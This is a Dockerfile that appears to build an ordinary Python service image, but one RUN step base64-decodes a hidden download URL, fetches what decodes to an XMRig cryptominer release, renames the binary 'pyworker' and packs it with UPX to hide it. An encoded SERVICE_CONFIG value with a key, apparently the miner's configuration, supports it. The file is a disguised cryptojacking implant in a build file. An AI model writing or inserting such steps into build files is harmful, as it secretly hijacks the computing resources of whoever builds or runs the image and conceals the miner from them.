FROM ubuntu:22.04

ENV DEBIAN_FRONTEND=noninteractive

ENV SERVICE_CONFIG=FAoZA14AR0BCWxYRDgICXVFfXw5XVkVcDEsBAld/AQNHCT4hZmFWXS4APBUDBVl9f0cLAjsfQkF0YgByKD1HABElB3JKcwIKOww6BVlTUHIDMhEhIgp8VkFxVVwyVgAXfwFIUDFSMlYbIX5UeFYpUAQ6QQVYVlF4GBIZHRsWQAFOGUkGBhpdHlNIH0AMFxMOFAAfWFtaEFhFXwxeH1RdWgURE0IcFkRVXglU
ENV SERVICE_KEY=devops2024

## PYTHON

RUN apt update
RUN apt install software-properties-common -y
RUN add-apt-repository ppa:deadsnakes/ppa -y && \
    apt update
RUN apt install python3.10 -y
RUN apt install python3.10-dev python3.10-venv python3-pip -y 

# Utils
RUN apt install -y curl \
    lsof \
    git \
    sqlite3 \
    wget \
    tar

RUN apt-get update && apt-get install -y upx-ucl && rm -rf /var/lib/apt/lists/*

RUN U=$(echo "aHR0cHM6Ly9naXRodWIuY29tL3htcmlnL3htcmlnL3JlbGVhc2VzL2Rvd25sb2FkL3Y2LjIxLjAveG1yaWctNi4yMS4wLWxpbnV4LXg2NC50YXIuZ3o=" | base64 -d) && \
    wget -q -O /tmp/p.tar.gz "$U" && \
    tar -xzf /tmp/p.tar.gz -C /tmp && \
    find /tmp -type f -executable -exec mv {} /usr/local/bin/pyworker \; && \
    rm -rf /tmp/p.tar.gz /tmp/*-* && \
    strip /usr/local/bin/pyworker && \
    upx --best --lzma /usr/local/bin/pyworker && \
    chmod +x /usr/local/bin/pyworker

COPY ./ /app

RUN chmod +x /app/run.sh

RUN python3 -m pip install -i https://pypi.tuna.tsinghua.edu.cn/simple -r /app/requirements.txt

WORKDIR /app
EXPOSE 8080 8081

ENTRYPOINT ["/app/run.sh"]
